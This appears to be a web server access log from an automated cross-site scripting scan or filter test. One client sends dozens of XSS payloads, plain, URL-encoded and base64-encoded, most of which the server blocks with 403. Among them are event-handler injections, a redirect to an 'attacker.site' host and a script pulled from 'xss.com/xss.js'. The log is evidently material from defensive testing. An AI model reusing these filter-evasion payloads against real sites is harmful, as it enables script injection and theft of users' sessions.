127.0.0.1 - - [24/Dec/2025:18:38:37 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.23.0.4 - - [24/Dec/2025:18:43:00 +0000] "GET /?24f8aa7cd6=Ik9ueD0oKSBvbk1vdVNlb1Zlcj1wcm9tcHQoMSk+ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:00 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:00 +0000] "GET /?d26601ee81=%22Onx=%28%29%20onMouSeoVer=prompt%281%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:00 +0000] "GET /%22Onx=%28%29%20onMouSeoVer=prompt%281%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:00 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:00 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "GET /?f1e2020f7b=Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "GET /Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "GET /%22OnCliCk=%22%28prompt%601%60%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:01 +0000] "GET /?63e96c1473=%22OnCliCk=%22%28prompt%601%60%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "GET /cHJvbXB0LmNhbGwobnVsbCwxKQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "GET /?765d56ff8f=cHJvbXB0LmNhbGwobnVsbCwxKQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
127.0.0.1 - - [24/Dec/2025:18:43:02 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "GET /prompt.call%28null%2C1%29 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:02 +0000] "GET /?560a36769d=prompt.call%28null%2C1%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "GET /YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "GET /?0d3cfca98c=YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "GET /?45df825ef0=alert.apply%28null%2C%20%5B1%5D%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "GET /Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:03 +0000] "GET /alert.apply%28null%2C%20%5B1%5D%29 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "GET /?57a22cd27b=Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "GET /&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "GET /?a42e8041c1=&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "GET /XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "GET /?a00028678d=XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:04 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:05 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:05 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:05 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:05 +0000] "GET /%5C%22autof%3Cx%3Eocus%20o%3Cx%3Enfocus=alert%3Cx%3E%281%29%2F%2F HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:05 +0000] "GET /?5f06bf6669=%5C%22autof%3Cx%3Eocus%20o%3Cx%3Enfocus=alert%3Cx%3E%281%29%2F%2F HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:05 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "GET /Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "GET /?8c11129a5d=Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "GET /%22%3E%3Cp%20only=1337%20onmouseenter=window.location.href=%2F%2Fattacker.site%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "GET /?7cc88c4bf7=%22%3E%3Cp%20only=1337%20onmouseenter=window.location.href=%2F%2Fattacker.site%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:06 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "GET /Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "GET /?998bfdeeac=Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "GET /%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "GET /PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "GET /?47598bb530=%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:07 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "GET /?48bee7fc12=PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "GET /%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript HTTP/1.1" 400 150 "-" "-" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "GET /?8feced565d=%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:08 +0000] "GET /Jy1hbGVydCgxKS8v HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:09 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:09 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:09 +0000] "GET /?263f70457d=Jy1hbGVydCgxKS8v HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:09 +0000] "GET /?c31e84b7e4=%27-alert%281%29%2F%2F HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:09 +0000] "GET /%27-alert%281%29%2F%2F HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:09 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:10 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:10 +0000] "CUST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:10 +0000] "CUST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:11 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:12 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:12 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:43:12 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
127.0.0.1 - - [24/Dec/2025:18:43:12 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
127.0.0.1 - - [24/Dec/2025:18:43:22 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
127.0.0.1 - - [24/Dec/2025:18:43:32 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
